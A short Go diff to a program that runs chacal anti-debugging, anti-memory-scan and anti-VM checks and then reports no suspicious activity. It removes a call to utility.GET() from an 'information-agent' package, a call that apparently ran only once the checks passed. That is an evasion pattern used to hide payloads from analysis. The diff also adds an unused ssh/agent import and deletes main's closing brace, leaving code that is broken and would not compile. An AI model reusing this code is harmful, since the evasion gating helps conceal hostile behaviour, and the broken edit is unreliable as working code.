@@ -2,11 +2,13 @@ package main
 
 import (
 	"fmt"
-	"os"
-	"github.com/coopersec/information-agent/utility"
 	"github.com/p3tr0v/chacal/antidebug"
 	"github.com/p3tr0v/chacal/antimem"
 	"github.com/p3tr0v/chacal/antivm"
+	"golang.org/x/crypto/ssh/agent"
+	"os"
+
+
 )
 
 func main() {
@@ -34,5 +36,4 @@ func main() {
 	}
 
 	fmt.Println("Chacal: No suspicious activity detected.")
-	utility.GET()
-}
+
